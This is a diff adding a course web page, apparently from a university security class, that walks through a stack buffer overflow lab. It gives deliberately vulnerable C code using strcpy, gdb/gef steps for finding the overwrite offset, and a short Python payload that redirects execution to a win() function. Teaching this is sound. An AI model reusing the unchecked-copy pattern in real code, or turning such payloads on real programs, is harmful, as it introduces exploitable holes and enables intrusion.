@@ -1,0 +1,145 @@
+---
+layout: ../../../layouts/SemesterMarkdown.astro
+---
+
+import { Image } from "astro:assets";
+import figure_6_5 from "@/images/security-book/figure-6.5.png";
+import gdb_pattern from "@/images/notes/gdb-pattern.png";
+import gdb_cause_crash from "@/images/notes/gdb-cause-crash.png";
+import gdb_crash from "@/images/notes/gdb-crash.png";
+import gdb_pattern_search from "@/images/notes/gdb-pattern-search.png";
+import gdb_disassem from "@/images/notes/gdb-disassem.png";
+import gdb_you_win from "@/images/notes/gdb-you-win.png";
+
+# Stack Overflow Walkthrough
+
+Recall the way the stack works:
+
+<Image alt="Stack overflow attack" src={figure_6_5} />
+
+- Note, this example assumes 4-byte memory words, but it works regardless of
+  word size
+
+```c
+void myfunction(char *src) { /* src is a ptr to a char string */
+  int var1, var2; /* 1 stack word used per integer */
+  char var3[4]; /* also 1 word for 4-byte buffer */
+  strcpy(var3, src); /* template: strcpy(dst, src) */
+}
+```
+
+Our goal is to overwrite the return address and point it somewhere else.
+
+## Preliminaries
+
+- Install [gef](https://github.com/hugsy/gef). This will make using gdb for exploits a lot simpler.
+
+- Use an [x86-64 reference](https://web.stanford.edu/class/cs107/resources/x86-64-reference.pdf).
+
+## Vulnerable code
+
+Here is the vulnerable code we'll be using. This is taken from `stack-overflow.c` in the [software security repo](https://github.com/BYU-CS465/software-security).
+
+```C
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void my_function(const char *);
+
+void win()
+{
+  printf("You win!\n");
+  exit(0);
+}
+
+int main(int argc, char **argv)
+{
+  char buf[101];
+
+  printf("Enter a string: ");
+  fgets(buf, 100, stdin);
+
+  my_function(buf);
+
+  printf("Exiting normally\n");
+}
+
+void my_function(const char *src)
+{
+  int var1 = 1;
+  char copy[4];
+  strcpy(copy, src);
+}
+```
+
+## Causing a crash
+
+Notice that the above code is using `strcpy()`. This means it should be easy to crash the program. Compile the vulnerable code, which results in an executable called `stack`. Run `gdb ./stack` and then generate a pattern: `pattern create 100`:
+
+<Image alt="Using the pattern create command in gdb" src={gdb_pattern} />
+
+Time permitting, we will also try the `buffer overflow 0` and `buffer overflow `
+exploits on the
+[PicoCTF website](https://play.picoctf.org/practice/challenge/257?category=6&page=1&search=buffer).
+
+Now run the program and supply the pattern as input:
+
+<Image
+  alt="Use the created pattern as input to the program"
+  src={gdb_cause_crash}
+/>
+
+Once you hit enter, then gdb, using `gef`, will show you:
+
+<Image alt="Crash output from gdb" src={gdb_crash} />
+
+- The top listing shows you registers, color-coded to show you which are affected by what we wrote on the stack.
+
+  - Notice that we can overwrite `$rsp`, the stack pointer
+  - Notice that we did not change `$rip`, the instruction pointer. This is because the address we've given in `$rsp` a 64-bit address and programs are capped at using 48-bit addresses.
+
+- The bottom listing shows you the stack.
+  - The program wrote the first four bytes of our pattern `aaaa` into the local variable `copy`. Use `p copy` to see its value.
+  - Then it continued copying past the buffer and changed `var1` to contain `0x61616161`, which is also `aaaa`. Use `p var` to see its value.
+  - Then it copied `baaaaaaa` into `$rbp`.
+  - Then it copied `caaaaaaa` into `$rsp` and kept going onto the rest of the stack.
+  - Notice that the stack is shown starting at `$rsp`.
+
+Now run `pattern search `caaaaaaad`:
+
+<Image alt="Use the pattern search command in gdb" src={gdb_pattern_search} />
+
+You should see the offset from the buffer to `$rsp`, which in this case is 16. We can pretty easily see that ourselves, but `pattern search` simplifies things a bit, and you won't always have the source code to work with.
+
+### Exploiting the vulnerability
+
+In this case, we want to "win" by having the program execute the `win()` function. We can do that by overwriting the `$rsp` to point to the `win()` function. To get this address, use `disassem win`:
+
+<Image alt="Use the disassem command in gdb" src={gdb_disassem} />
+
+In this case, we can see that the address is `0x4011b6`.
+
+At this point, use a small program we have written, called `exploit.py`:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+NUM = 16
+
+payload = b"A" * NUM + b'\xb6\x11\x40\x00\x00\x00\x00\x00'
+sys.stdout.buffer.write(payload)
+print()
+```
+
+This writes out the number of `A` characters specified, followed by our address, which is in reverse order because the machine is little endian. You can execute this program using: `python exploit.py > payload.txt`.
+
+Now go back to gdb and provide this as input, using `r < payload.txt`:
+
+<Image
+  alt="use gdb to run the program with the specified input"
+  src={gdb_you_win}
+/>
+
+You can also run this on the command line to verify it works: `./stack < payload.txt`.
